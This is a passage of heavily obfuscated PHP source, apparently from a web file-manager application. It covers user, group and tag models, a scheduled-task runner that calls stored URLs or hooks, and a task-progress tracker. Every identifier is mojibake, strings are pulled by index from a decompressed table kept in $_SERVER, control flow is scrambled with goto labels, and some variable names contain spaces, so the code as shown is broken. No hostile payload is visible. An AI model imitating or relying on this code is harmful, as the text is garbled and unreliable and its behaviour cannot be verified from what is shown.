$få¥…íËÙ[1465]); $this->_listAppendGroup($a‰ÆÑÈŸÇ, $Eá‘šä¶·Ö); $this->_listAppendMeta($a‰ÆÑÈŸÇ, $Eá‘šä¶·Ö); goto a÷Ã©„ÙßÛ; AÛ–òì§ë‹: } private function _listAppendSourceRoot(&$e‰³²Ó‡¼, $Eí¥ôï›ë‹) { goto E’Á§†óÆ¹; d›¦„®•…Â: foreach ($e‰³²Ó‡¼ as &$B»®ÚĞË‚ô) { $B»®ÚĞË‚ô[$eŒÜÆ¹¥¯Ğ[416]] = $C‰–ŞÇÌ±Ù[$B»®ÚĞË‚ô[$eŒÜÆ¹¥¯Ğ[1465]]] ? $C‰–ŞÇÌ±Ù[$B»®ÚĞË‚ô[$eŒÜÆ¹¥¯Ğ[1465]]] : array(); } unset($B»®ÚĞË‚ô); goto bˆ¡éáåø; E’Á§†óÆ¹: $eŒÜÆ¹¥¯Ğ =& $_SERVER[åÌÛ»ô¢‚ö™]; $B¾‚œâ§«ù = array($eŒÜÆ¹¥¯Ğ[487] => 0, $eŒÜÆ¹¥¯Ğ[396] => SourceModel::TYPE_USER, $eŒÜÆ¹¥¯Ğ[482] => array($eŒÜÆ¹¥¯Ğ[7], $Eí¥ôï›ë‹)); $CÂ’™ËÚ„Œ = $eŒÜÆ¹¥¯Ğ[2230]; goto E¡•íÓ’; E¡•íÓ’: $C‰–ŞÇÌ±Ù = Model($eŒÜÆ¹¥¯Ğ[778])->order($eŒÜÆ¹¥¯Ğ[2231])->field($CÂ’™ËÚ„Œ)->where($B¾‚œâ§«ù)->select(); $C‰–ŞÇÌ±Ù = array_to_keyvalue($C‰–ŞÇÌ±Ù, $eŒÜÆ¹¥¯Ğ[482]); $C‰–ŞÇÌ±Ù = array_remove_key($C‰–ŞÇÌ±Ù, $eŒÜÆ¹¥¯Ğ[482]); goto d›¦„®•…Â; bˆ¡éáåø: } private function _listAppendGroup(&$EĞ¤‹„Œİ, $fóŠ½¶ºøÏ) { goto C½“¹½µÃÚ; E¹É¹£ó…ù: $fá —­…‚ = array($Eİ†‰ååº[2138] => array($Eİ†‰ååº[7], $fôì¢ÔÃØ)); $dàô¸›÷ƒƒ = Model($Eİ†‰ååº[2305])->field($Eİ†‰ååº[2591])->where($fá —­…‚)->select(); $dàô¸›÷ƒƒ = array_to_keyvalue($dàô¸›÷ƒƒ, $Eİ†‰ååº[2138]); goto bÔÍš‹Š; bÔÍš‹Š: $DöÑŒ›îàî = array_to_keyvalue_group($DöÑŒ›îàî, $Eİ†‰ååº[1465]); foreach ($DöÑŒ›îàî as &$a‰ÄÃ°™…) { $DáÃš»‡¶­ = array(); foreach ($a‰ÄÃ°™… as $CÍÍ¢‹±­­) { if (!$CÍÍ¢‹±­­[$Eİ†‰ååº[2282]]) { continue; } $D¶¼Ä­·˜Æ = Model($Eİ†‰ååº[2301])->listData($CÍÍ¢‹±­­[$Eİ†‰ååº[2282]]); $DáÃš»‡¶­[] = array($Eİ†‰ååº[2138] => $CÍÍ¢‹±­­[$Eİ†‰ååº[2138]], $Eİ†‰ååº[2592] => $dàô¸›÷ƒƒ[$CÍÍ¢‹±­­[$Eİ†‰ååº[2138]]][$Eİ†‰ååº[28]], $Eİ†‰ååº[485] => $dàô¸›÷ƒƒ[$CÍÍ¢‹±­­[$Eİ†‰ååº[2138]]][$Eİ†‰ååº[485]], $Eİ†‰ååº[401] => $D¶¼Ä­·˜Æ); } $a‰ÄÃ°™… = $DáÃš»‡¶­; } unset($a‰ÄÃ°™…); goto aÕ‹»¡²—·; C½“¹½µÃÚ: $Eİ†‰ååº =& $_SERVER[åÌÛ»ô¢‚ö™]; $fá —­…‚ = array($Eİ†‰ååº[1465] => array($Eİ†‰ååº[7], $fóŠ½¶ºøÏ)); $DöÑŒ›îàî = Model($Eİ†‰ååº[2217])->where($fá —­…‚)->select(); goto AĞ˜ğ¤ˆê‰; AĞ˜ğ¤ˆê‰: $fôì¢ÔÃØ = array_to_keyvalue($DöÑŒ›îàî, $Eİ†‰ååº[33], $Eİ†‰ååº[2138]); $fôì¢ÔÃØ = array_remove_value(array_unique($fôì¢ÔÃØ), $Eİ†‰ååº[494]); if (!$fôì¢ÔÃØ || !$DöÑŒ›îàî) { return; } goto E¹É¹£ó…ù; aÕ‹»¡²—·: foreach ($EĞ¤‹„Œİ as &$eªí°Óõ‘) { $eªí°Óõ‘[$Eİ†‰ååº[2307]] = array(); if (isset($DöÑŒ›îàî[$eªí°Óõ‘[$Eİ†‰ååº[1465]]])) { $eªí°Óõ‘[$Eİ†‰ååº[2307]] = $DöÑŒ›îàî[$eªí°Óõ‘[$Eİ†‰ååº[1465]]]; } } unset($eªí°Óõ‘); goto cÁÒ„‹‡ ì; cÁÒ„‹‡ ì: } private function _listAppendMeta(&$FßÏÎßÂö«, $F„’ñ´©©Á) { goto cŸÄç£¹ç§; fÁ•Æß§¤ˆ: foreach ($FßÏÎßÂö« as &$dº‹æİİ£²) { $BõÄ±Û”Ú = array(); if (isset($dëğ¬Ïîƒ°[$dº‹æİİ£²[$cøçÜ‡Ë„[1465]]])) { $BõÄ±Û”Ú = $dëğ¬Ïîƒ°[$dº‹æİİ£²[$cøçÜ‡Ë„[1465]]]; } $dº‹æİİ£²[$cøçÜ‡Ë„[2594]] = array(); if (isset($BõÄ±Û”Ú[$eÍ…ÊËİá½])) { $dº‹æİİ£²[$cøçÜ‡Ë„[2594]] = $BßÏ¢¢÷İÀ->getUserJobInfo($BõÄ±Û”Ú[$eÍ…ÊËİá½]); } } unset($dº‹æİİ£²); goto F¼×‚ƒ…™‚; dÑÔÏĞ¦ÊÃ: $f¬¦Şù¹ºŞ = array($cøçÜ‡Ë„[1465] => array($cøçÜ‡Ë„[7], $F„’ñ´©©Á)); $dëğ¬Ïîƒ° = Model($cøçÜ‡Ë„[2569])->where($f¬¦Şù¹ºŞ)->select(); $dëğ¬Ïîƒ° = array_to_keyvalue_group($dëğ¬Ïîƒ°, $cøçÜ‡Ë„[1465]); goto cÇ½ Û»¬ò; cÇ½ Û»¬ò: foreach ($dëğ¬Ïîƒ° as &$d¤çÀ‚×ÖÜ) { $e×•øÛ÷ªÌ = array(); foreach ($d¤çÀ‚×ÖÜ as $e½İñ‡ªÙ—) { if (!in_array($e½İñ‡ªÙ—[$cøçÜ‡Ë„[89]], $a‘ÕÊÔ®š¥)) { $e×•øÛ÷ªÌ[$e½İñ‡ªÙ—[$cøçÜ‡Ë„[89]]] = $e½İñ‡ªÙ—[$cøçÜ‡Ë„[375]]; } } $d¤çÀ‚×ÖÜ = $e×•øÛ÷ªÌ; } unset($d¤çÀ‚×ÖÜ); $BßÏ¢¢÷İÀ = Model($cøçÜ‡Ë„[2593]); goto fÁ•Æß§¤ˆ; cŸÄç£¹ç§: $cøçÜ‡Ë„ =& $_SERVER[åÌÛ»ô¢‚ö™]; $eÍ…ÊËİá½ = UserJobModel::JOB_KEY; $a‘ÕÊÔ®š¥ = array($cøçÜ‡Ë„[2571]); goto dÑÔÏĞ¦ÊÃ; F¼×‚ƒ…™‚: } protected function groupUserAll($DÂ¿İ—Ğ„›) { $aé²¾Ì˜íæ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$DÂ¿İ—Ğ„›) { return !1; } $cªÎ¶éŠñ = Model($aé²¾Ì˜íæ[2217])->field($aé²¾Ì˜íæ[1465])->where(array($aé²¾Ì˜íæ[2138] => array($aé²¾Ì˜íæ[7], $DÂ¿İ—Ğ„›)))->select(); $cªÎ¶éŠñ = array_to_keyvalue($cªÎ¶éŠñ, $aé²¾Ì˜íæ[33], $aé²¾Ì˜íæ[1465]); return array_unique($cªÎ¶éŠñ); } public function userSearch($E³¹¢Ò¬ì, $A ÉèŸè = "\52") { return Model($_SERVER[åÌÛ»ô¢‚ö™][503])->where($E³¹¢Ò¬ì)->field($A ÉèŸè)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\x72\137\157\160\x74\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($C¬ÎòøÍ£) { $c””¸ÒÊ¦ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!defined($c””¸ÒÊ¦[451])) { define($c””¸ÒÊ¦[451], 0); } return "\125\163\x65\x72\x4f\160\164\x69\x6f\x6e\x5f{$C¬ÎòøÍ£}\x5f" . USER_ID; } protected function filterWhere($b°Ìä¶‹Üµ) { $D´Å‚‚£Á =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!defined($D´Å‚‚£Á[451])) { define($D´Å‚‚£Á[451], 0); } $b°Ìä¶‹Üµ[$D´Å‚‚£Á[1465]] = USER_ID; return $b°Ìä¶‹Üµ; } public function cacheRemoveUser($dŒ›«ÍŒŠ, $f‡“†·“Š) { return Cache::remove("\x55\x73\145\x72\117\x70\164\x69\x6f\x6e\137{$dŒ›«ÍŒŠ}\137" . $f‡“†·“Š); } protected function optionDefault($AÑğšˆè · = '') { $EÅŒáÛ«Ì– =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($AÑğšˆè · == $EÅŒáÛ«Ì–[33]) { return $GLOBALS[$EÅŒáÛ«Ì–[6]][$EÅŒáÛ«Ì–[2595]]; } if ($AÑğšˆè · == $EÅŒáÛ«Ì–[2596]) { return $GLOBALS[$EÅŒáÛ«Ì–[6]][$EÅŒáÛ«Ì–[2597]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\162\x2e\164\141\x67\114\x69\163\164"; public $modelType = "\125\x73\145\162\x4f\x70\x74\151\157\x6e"; public $field = array("\x6e\x61\x6d\x65", "\x73\164\171\154\145", "\163\x6f\x72\x74"); public function listData($a«ºÃ‡·µƒ = false, $BÆÂ±ÙÀË½ = "\x73\157\x72\164", $bÀß„İ‡Ì = false) { return parent::listData($a«ºÃ‡·µƒ, $BÆÂ±ÙÀË½, $bÀß„İ‡Ì); } public function remove($FŸŒæ´œ‡å) { return parent::remove($FŸŒæ´œ‡å); } public function add($bæïÓÒÖ”¯, $C¥äç¹Æˆï = "\x6c\x61\142\145\x6c\55\147\162\145\x79\55\x6e\157\x72\155\141\154") { $e¨—š®Ø¢ì =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($this->findByName($bæïÓÒÖ”¯)) { return !1; } $b®ºÁˆ“¬Ì = array($e¨—š®Ø¢ì[411] => $bæïÓÒÖ”¯, $e¨—š®Ø¢ì[461] => $C¥äç¹Æˆï, $e¨—š®Ø¢ì[2142] => $this->getSort($e¨—š®Ø¢ì[261]) + 1); return parent::insert($b®ºÁˆ“¬Ì); } public function update($eé‰ÒÛ¹˜…, $F×©ÃĞÀìä) { $fğ¶ßÙ§ù =& $_SERVER[åÌÛ»ô¢‚ö™]; $EĞ æßç‹ = $this->listData($eé‰ÒÛ¹˜…); $f›ô°Æó¬ = $this->findByName($F×©ÃĞÀìä[$fğ¶ßÙ§ù[28]]); if (!$EĞ æßç‹ || $f›ô°Æó¬ && $f›ô°Æó¬[$fğ¶ßÙ§ù[392]] != $EĞ æßç‹[$fğ¶ßÙ§ù[392]]) { return !1; } return parent::update($eé‰ÒÛ¹˜…, $F×©ÃĞÀìä); } public function moveTop($f¥‰·îÖ¦) { $Aè‡¾ÚïóÕ =& $_SERVER[åÌÛ»ô¢‚ö™]; $fóøîí—ÈÏ = parent::listData(); $c‘ğŠÖ·š¹ = $this->getSort($Aè‡¾ÚïóÕ[260]); foreach ($fóøîí—ÈÏ as &$B‘ï ŒôÔÓ) { if ($B‘ï ŒôÔÓ[$Aè‡¾ÚïóÕ[392]] == $f¥‰·îÖ¦) { $B‘ï ŒôÔÓ[$Aè‡¾ÚïóÕ[2160]] = $c‘ğŠÖ·š¹; continue; } $B‘ï ŒôÔÓ[$Aè‡¾ÚïóÕ[2160]] += 1; } unset($B‘ï ŒôÔÓ); return parent::resetData($fóøîí—ÈÏ); } public function moveBottom($C”È³È´) { $dÎÄÏò²¥ =& $_SERVER[åÌÛ»ô¢‚ö™]; $D‰§õ‰ù²Ø = $this->getSort($dÎÄÏò²¥[261]) + 1; return parent::update($C”È³È´, array($dÎÄÏò²¥[2160] => $D‰§õ‰ù²Ø)); } public function resetSort($eœ‰ÉŞÙ˜) { goto BÆ…œå®ºÕ; c¦ÄğâŒ÷: for ($fğ¤à‹İ = 0; $fğ¤à‹İ < count($eœ‰ÉŞÙ˜); $fğ¤à‹İ++) { $aÌ £­†í[$eœ‰ÉŞÙ˜[$fğ¤à‹İ] . $B÷ÉË¯•¬õ[33]] = $fğ¤à‹İ + 1; } $Dìê‘›À‰Û = parent::listData(); foreach ($Dìê‘›À‰Û as &$CÚ¬ÆóÜ¾Ï) { $CÕõ…ñ®¿‹ = $aÌ £­†í[$CÚ¬ÆóÜ¾Ï[$B÷ÉË¯•¬õ[392]]]; $CÚ¬ÆóÜ¾Ï[$B÷ÉË¯•¬õ[2160]] = $CÕõ…ñ®¿‹ ? $CÕõ…ñ®¿‹ : $CÚ¬ÆóÜ¾Ï[$B÷ÉË¯•¬õ[2160]]; } goto FöØ¶‹×‹; FöØ¶‹×‹: unset($CÚ¬ÆóÜ¾Ï); return parent::resetData($Dìê‘›À‰Û); goto A¥‚òÊ§İ—; BÆ…œå®ºÕ: $B÷ÉË¯•¬õ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aÌ £­†í = array(); $eœ‰ÉŞÙ˜ = is_array($eœ‰ÉŞÙ˜) ? $eœ‰ÉŞÙ˜ : array(); goto c¦ÄğâŒ÷; A¥‚òÊ§İ—: } private function getSort($D¤³¦¨˜–) { $fÙĞèæÀà =& $_SERVER[åÌÛ»ô¢‚ö™]; $a„Ë¼ÊÓÁó = parent::listData(); $F¿¾­öã = array_to_keyvalue($a„Ë¼ÊÓÁó, $fÙĞèæÀà[33], $fÙĞèæÀà[2160]); if (!$F¿¾­öã) { $F¿¾­öã = array(0); } $bá‡‡»Öç = $D¤³¦¨˜– == $fÙĞèæÀà[261] ? max($F¿¾­öã) : min($F¿¾­öã); return intval($bá‡‡»Öç); } } goto dàÈæÙ–; AÈ£¯Á«²§: $Bçƒ¸º‰ = $_SERVER[åÌÛ»ô¢‚ö™][572]; if (strlen($Bçƒ¸º‰) < $_SERVER[åÌÛ»ô¢‚ö™][573]) { return; } $_SERVER[µ¨«] = explode($_SERVER[åÌÛ»ô¢‚ö™][574], gzinflate(substr($_SERVER[åÌÛ»ô¢‚ö™][575], 10, -8))); goto EÙİËÁ¥Ó†; bŠìù¯Èèä: class AutoTask { public static function start() { goto F¯¢ªõ•; bÔãÓ¼…§§: http_close(); self::valueSet($fŠß“ŞÈğ˜[1428], $fŠß“ŞÈğ˜[83]); Hook::bind($fŠß“ŞÈğ˜[1430], $fŠß“ŞÈğ˜[1431]); goto aÈŸ½ç¾äÈ; aÈŸ½ç¾äÈ: while (!0) { self::cacheClear(); if (self::valueGet($fŠß“ŞÈğ˜[716]) != $fŠß“ŞÈğ˜[83]) { self::valueSet($fŠß“ŞÈğ˜[1428], $fŠß“ŞÈğ˜[494]); self::log($fŠß“ŞÈğ˜[1432]); die; } self::valueSet($fŠß“ŞÈğ˜[1428], $fŠß“ŞÈğ˜[83]); self::valueSet($fŠß“ŞÈğ˜[1429], time()); self::taskRunAll(); sleep(self::valueGet($fŠß“ŞÈğ˜[1433])); } goto FÖ™‡•àÏ; F¯¢ªõ•: $fŠß“ŞÈğ˜ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (self::valueGet($fŠß“ŞÈğ˜[716]) != $fŠß“ŞÈğ˜[83]) { return; } if (self::valueGet($fŠß“ŞÈğ˜[1428]) == $fŠß“ŞÈğ˜[83]) { $bŠ£¢ëä¢ì = self::valueGet($fŠß“ŞÈğ˜[1429]); if (time() - $bŠ£¢ëä¢ì > 3600 * 2) { self::restart(); } return; } goto bÔãÓ¼…§§; FÖ™‡•àÏ: } public static function restart() { $D´²¶‰¿  =& $_SERVER[åÌÛ»ô¢‚ö™]; http_close(); self::valueSet($D´²¶‰¿ [716], $D´²¶‰¿ [494]); sleep(self::valueGet($D´²¶‰¿ [1433]) + 5); self::valueSet($D´²¶‰¿ [1428], $D´²¶‰¿ [494]); self::valueSet($D´²¶‰¿ [716], $D´²¶‰¿ [83]); } public static function shutdownEvent() { $F…«š¡Äßß =& $_SERVER[åÌÛ»ô¢‚ö™]; self::valueSet($F…«š¡Äßß[1428], $F…«š¡Äßß[494]); self::log($F…«š¡Äßß[1434]); } public static function config($dÏœµÀ™«È, $e¢©Ô²’š¶) { $b’È•î‚È =& $_SERVER[åÌÛ»ô¢‚ö™]; $BÅ¦“’¾Î‡ = 10; $e¢©Ô²’š¶ = intval($e¢©Ô²’š¶) <= $BÅ¦“’¾Î‡ ? $BÅ¦“’¾Î‡ : intval($e¢©Ô²’š¶); self::valueSet($b’È•î‚È[716], $dÏœµÀ™«È); self::valueSet($b’È•î‚È[1433], $e¢©Ô²’š¶); } private static function taskRunAll() { goto eâ™•„Æ¬™; eâ™•„Æ¬™: $AÕå¹…„ =& $_SERVER[åÌÛ»ô¢‚ö™]; $f©ñ•÷¹ = timeFloat(); $eÏë·æ™Í¡ = Model($AÕå¹…„[1435])->listData(); goto FÏç×î„ïø; BØ·‚¦‚ƒ: self::taskQueueRun($f©ñ•÷¹); self::closeDatabase(); goto D ŠÈº×á†; FÏç×î„ïø: $eœ–®ÂÓÕ’ = count($eÏë·æ™Í¡); for ($eö¸äšÊ›İ = 0; $eö¸äšÊ›İ < $eœ–®ÂÓÕ’; $eö¸äšÊ›İ++) { $e¸“ùŒ›Œñ = $eÏë·æ™Í¡[$eö¸äšÊ›İ]; if ($e¸“ùŒ›Œñ[$AÕå¹…„[1436]] != $AÕå¹…„[83]) { continue; } if (!self::taskTimeCheck($e¸“ùŒ›Œñ)) { continue; } self::taskRun($e¸“ùŒ›Œñ); } Hook::trigger($AÕå¹…„[1437]); goto BØ·‚¦‚ƒ; D ŠÈº×á†: } private static function taskQueueRun($a³ï‘ÌÔ­Ş) { $Bù÷¦å‚Ú = 10; while (!0) { $Bº´Ìˆºß‚ = TaskQueue::run(); if ($Bº´Ìˆºß‚ === !1) { break; } if (timeFloat() - $a³ï‘ÌÔ­Ş >= $Bù÷¦å‚Ú) { break; } } } private static function taskTimeCheck($Döç¥øÍµ) { goto b›‹™¨òæã; B‘¦ì­‘¦Ú: $FÕÊ‹£›¤Ø = strtotime($A¾Ã·æÔ§¡[1438] . $cºò–ÈÊáí[$A¾Ã·æÔ§¡[1439]] . $A¾Ã·æÔ§¡[1440]) - strtotime($A¾Ã·æÔ§¡[1441]); $EÆŞË§ìÖ” = time() - strtotime(date($A¾Ã·æÔ§¡[1442]) . $A¾Ã·æÔ§¡[1443]); $DĞ˜Ë‘‹í¥ = $EÆŞË§ìÖ” >= $FÕÊ‹£›¤Ø && $EÆŞË§ìÖ” <= $FÕÊ‹£›¤Ø + 3600; goto dğ”¾ØƒõŸ; b›‹™¨òæã: $A¾Ã·æÔ§¡ =& $_SERVER[åÌÛ»ô¢‚ö™]; $cºò–ÈÊáí = json_decode($Döç¥øÍµ[$A¾Ã·æÔ§¡[203]], !0); $CäÈîÙ¾¬• = intval($Döç¥øÍµ[$A¾Ã·æÔ§¡[1429]]); goto B‘¦ì­‘¦Ú; dğ”¾ØƒõŸ: switch ($cºò–ÈÊáí[$A¾Ã·æÔ§¡[29]]) { case $A¾Ã·æÔ§¡[1444]: if (time() - $CäÈîÙ¾¬• < 3600 * 24 * 30) { return !1; } if ($cºò–ÈÊáí[$A¾Ã·æÔ§¡[1444]] == date($A¾Ã·æÔ§¡[1445]) && $DĞ˜Ë‘‹í¥) { return !0; } break; case $A¾Ã·æÔ§¡[1446]: if (time() - $CäÈîÙ¾¬• < 3600 * 24 * 7) { return !1; } $bÉ¤´Ó§š = date($A¾Ã·æÔ§¡[1447]) == 0 ? 7 : date($A¾Ã·æÔ§¡[1447]); if ($cºò–ÈÊáí[$A¾Ã·æÔ§¡[1446]] == $bÉ¤´Ó§š && $DĞ˜Ë‘‹í¥) { return !0; } break; case $A¾Ã·æÔ§¡[1439]: if (time() - $CäÈîÙ¾¬• < 3600 * 24) { return !1; } if ($DĞ˜Ë‘‹í¥) { return !0; } break; case $A¾Ã·æÔ§¡[1448]: if (time() - $CäÈîÙ¾¬• >= floatval($cºò–ÈÊáí[$A¾Ã·æÔ§¡[1448]]) * 60) { return !0; } break; default: break; } return !1; goto dßğîß†; dßğîß†: } private function closeDatabase() { goto F‹ÑïÆ…°÷; d…À£‹‚Ô: $B½¸ÊÂ÷Áî = Model($Dã–Úºã­[500])->db($Dã–Úºã­[33]); if ($B½¸ÊÂ÷Áî) { $B½¸ÊÂ÷Áî->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($Dã–Úºã­[1449], $Dã–Úºã­[1450]); die; } goto c™õå„–›Ñ; b‹¥ğÌó : if (!$FƒŞÚ‰Ü«) { $FƒŞÚ‰Ü« = time(); } if (time() - $FƒŞÚ‰Ü« < $bÜñ§öë®‰) { return; } $FƒŞÚ‰Ü« = time(); goto d…À£‹‚Ô; F‹ÑïÆ…°÷: $Dã–Úºã­ =& $_SERVER[åÌÛ»ô¢‚ö™]; static $FƒŞÚ‰Ü« = 0; $bÜñ§öë®‰ = 1800; goto b‹¥ğÌó ; c™õå„–›Ñ: } public static function taskRun($f¹·Öµåò¦) { goto Aåàêœƒ¢; E‹ŒÔ„´¬«: $EÄœä°²Ú = timeFloat(); $FÙ‡„ˆ„é‡ = $Bà¢°øŠ[33]; switch ($f¹·Öµåò¦[$Bà¢°øŠ[29]]) { case $Bà¢°øŠ[310]: $Fæ„ÆÇ„‰ã = url_request($f¹·Öµåò¦[$Bà¢°øŠ[1454]], $Bà¢°øŠ[234], !1, !1, !1, !1, 5); $FÙ‡„ˆ„é‡ = strlen($Fæ„ÆÇ„‰ã); break; case $Bà¢°øŠ[233]: $FÙ‡„ˆ„é‡ = Hook::apply($f¹·Öµåò¦[$Bà¢°øŠ[1454]]); default: break; } goto E‰³ïÖô; E‰³ïÖô: Model($Bà¢°øŠ[1455])->add(array($Bà¢°øŠ[1456] => $Bà¢°øŠ[33], $Bà¢°øŠ[1457] => $Bà¢°øŠ[494], $Bà¢°øŠ[29] => $Bà¢°øŠ[1458] . $f¹·Öµåò¦[$Bà¢°øŠ[392]], $Bà¢°øŠ[1459] => json_encode(array($Bà¢°øŠ[28] => $f¹·Öµåò¦[$Bà¢°øŠ[28]], $Bà¢°øŠ[1460] => timeFloat() - $EÄœä°²Ú, $Bà¢°øŠ[296] => $FÙ‡„ˆ„é‡)))); self::log($Bà¢°øŠ[1461] . $f¹·Öµåò¦[$Bà¢°øŠ[392]] . $Bà¢°øŠ[1462] . $FÙ‡„ˆ„é‡); return !0; goto dÇï±âÏ; Aåàêœƒ¢: $Bà¢°øŠ =& $_SERVER[åÌÛ»ô¢‚ö™]; self::log($Bà¢°øŠ[1451] . $f¹·Öµåò¦[$Bà¢°øŠ[392]] . $Bà¢°øŠ[1452] . $f¹·Öµåò¦[$Bà¢°øŠ[28]] . $Bà¢°øŠ[1453] . $f¹·Öµåò¦[$Bà¢°øŠ[1454]]); Model($Bà¢°øŠ[1435])->run($f¹·Öµåò¦[$Bà¢°øŠ[392]]); goto E‹ŒÔ„´¬«; dÇï±âÏ: } private static function valueGet($F¨¸‰˜¹) { $e‰ó‘½£ =& $_SERVER[åÌÛ»ô¢‚ö™]; $c³§ÜäÍ™ = $e‰ó‘½£[1463]; $fËƒ†äî‹“ = Model($e‰ó‘½£[1464])->get($F¨¸‰˜¹, $c³§ÜäÍ™); if (is_null($fËƒ†äî‹“)) { Model($e‰ó‘½£[1464])->set($e‰ó‘½£[1433], 10, $c³§ÜäÍ™); Model($e‰ó‘½£[1464])->set($e‰ó‘½£[716], $e‰ó‘½£[83], $c³§ÜäÍ™); Model($e‰ó‘½£[1464])->set($e‰ó‘½£[1428], $e‰ó‘½£[494], $c³§ÜäÍ™); $fËƒ†äî‹“ = Model($e‰ó‘½£[1464])->get($F¨¸‰˜¹, $c³§ÜäÍ™); } return $fËƒ†äî‹“; } private static function valueSet($e¯óõÎŠ¿, $FÓ¿†„Ë›Û) { $bì©Š¨Å¿È =& $_SERVER[åÌÛ»ô¢‚ö™]; return Model($bì©Š¨Å¿È[1464])->set($e¯óõÎŠ¿, $FÓ¿†„Ë›Û, $bì©Š¨Å¿È[1463]); } protected static function log($a‰—ôõëÍÅ) { write_log($a‰—ôõëÍÅ, $_SERVER[åÌÛ»ô¢‚ö™][1450]); } private static function cacheClear() { $AÈĞË‰Œ‡² =& $_SERVER[åÌÛ»ô¢‚ö™]; $F´‚Œ„•¶Ô = Model($AÈĞË‰Œ‡²[1464])->cacheKey($AÈĞË‰Œ‡²[1463]); Cache::clearMemory($F´‚Œ„•¶Ô); Model($AÈĞË‰Œ‡²[1435])->cacheClear(); } } class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\x72\165\156\156\151\156\147"; const STATYS_KILL = "\153\x69\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($a‰Ç¿ª¹®, $cŞÒœ×¸Ç« = '', $B†ÑåŞÉù = 0, $f›…‘Ÿî«£ = '') { goto BÃŸÖ‡‚ã„; BÃŸÖ‡‚ã„: $dÛÍâîá»¶ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (self::get($a‰Ç¿ª¹®)) { return; } $this->task = array($dÛÍâîá»¶[392] => $a‰Ç¿ª¹®, $dÛÍâîá»¶[1465] => USER_ID, $dÛÍâîá»¶[1368] => $f›…‘Ÿî«£, $dÛÍâîá»¶[29] => $cŞÒœ×¸Ç«, $dÛÍâîá»¶[1001] => $dÛÍâîá»¶[33], $dÛÍâîá»¶[999] => $B†ÑåŞÉù, $dÛÍâîá»¶[1013] => 0, $dÛÍâîá»¶[1466] => 0, $dÛÍâîá»¶[1467] => 0, $dÛÍâîá»¶[1468] => timeFloat(), $dÛÍâîá»¶[1469] => 0, $dÛÍâîá»¶[1470] => 0, $dÛÍâîá»¶[1471] => 0, $dÛÍâîá»¶[1472] => 0, $dÛÍâîá»¶[716] => $dÛÍâîá»¶[1428]); goto Bº†ÌÏŞ”; Bº†ÌÏŞ”: Hook::bind($dÛÍâîá»¶[1430], array($this, $dÛÍâîá»¶[1473])); Hook::bind($dÛÍâîá»¶[1474], array($this, $dÛÍâîá»¶[1475])); $this->startAfter(); goto DŸ‰®ª‡Î¹; DŸ‰®ª‡Î¹: Hook::trigger($dÛÍâîá»¶[1476], $this->task); $this->task[$dÛÍâîá»¶[1470]] = timeFloat(); goto c·˜ñ¦§Ú; c·˜ñ¦§Ú: } public function end() { goto BØ¸ê¨İï‰; b°Ûºø‹¶: Hook::unbind($D‰¶¹ËŞƒÊ[1474], array($this, $D‰¶¹ËŞƒÊ[1475])); $this->endAfter(); $this->task = !1; goto C£Â«›«›¶; c¬•´¿àÒÅ: $eêÅ©¬í… = timeFloat() - $this->task[$D‰¶¹ËŞƒÊ[1468]]; self::log($D‰¶¹ËŞƒÊ[1477] . $this->task[$D‰¶¹ËŞƒÊ[392]] . $D‰¶¹ËŞƒÊ[1478] . $eêÅ©¬í… . $D‰¶¹ËŞƒÊ[1479]); Hook::unbind($D‰¶¹ËŞƒÊ[1430], array($this, $D‰¶¹ËŞƒÊ[1473])); goto b°Ûºø‹¶; BØ¸ê¨İï‰: $D‰¶¹ËŞƒÊ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->task) { return; } if ($this->task[$D‰¶¹ËŞƒÊ[1470]]) { self::valueSet($this->task[$D‰¶¹ËŞƒÊ[392]], !1); } goto c¬•´¿àÒÅ; C£Â«›«›¶: } public function update($bÙ ˜¿ì– = 0, $F—±‹ÒÊ¢ = false) { goto AğÚÊŒ‹á·; côğÃŞªŞó: Hook::trigger($a‹Ã‹ŒÕ„[1483], $D‡®½£µ»); self::valueSet($D‡®½£µ»[$a‹Ã‹ŒÕ„[392]], $D‡®½£µ»); goto dÑÔ÷íæµë; aÃÛŒƒ·‡: $D‡®½£µ»[$a‹Ã‹ŒÕ„[1013]] += $bÙ ˜¿ì–; $D‡®½£µ»[$a‹Ã‹ŒÕ„[1469]] = timeFloat(); if ($D‡®½£µ»[$a‹Ã‹ŒÕ„[999]]) { if ($D‡®½£µ»[$a‹Ã‹ŒÕ„[999]] < $D‡®½£µ»[$a‹Ã‹ŒÕ„[1013]]) { $D‡®½£µ»[$a‹Ã‹ŒÕ„[999]] = $D‡®½£µ»[$a‹Ã‹ŒÕ„[1013]]; } $e¤ğò®Ù¨‡ = timeFloat() - $D‡®½£µ»[$a‹Ã‹ŒÕ„[1468]] - $D‡®½£µ»[$a‹Ã‹ŒÕ„[1471]]; $D‡®½£µ»[$a‹Ã‹ŒÕ„[1466]] = $D‡®½£µ»[$a‹Ã‹ŒÕ„[1013]] / $D‡®½£µ»[$a‹Ã‹ŒÕ„[999]]; $D‡®½£µ»[$a‹Ã‹ŒÕ„[1467]] = $D‡®½£µ»[$a‹Ã‹ŒÕ„[1013]] / $e¤ğò®Ù¨‡; if ($D‡®½£µ»[$a‹Ã‹ŒÕ„[1466]] > 0) { $D‡®½£µ»[$a‹Ã‹ŒÕ„[1472]] = $e¤ğò®Ù¨‡ * (1 - $D‡®½£µ»[$a‹Ã‹ŒÕ„[1466]]) / $D‡®½£µ»[$a‹Ã‹ŒÕ„[1466]]; } $D‡®½£µ»[$a‹Ã‹ŒÕ„[1472]] = $D‡®½£µ»[$a‹Ã‹ŒÕ„[1472]] <= 0 ? 0 : $D‡®½£µ»[$a‹Ã‹ŒÕ„[1472]]; } goto c˜ÑÊİ¾ŠÚ; AğÚÊŒ‹á·: $a‹Ã‹ŒÕ„ =& 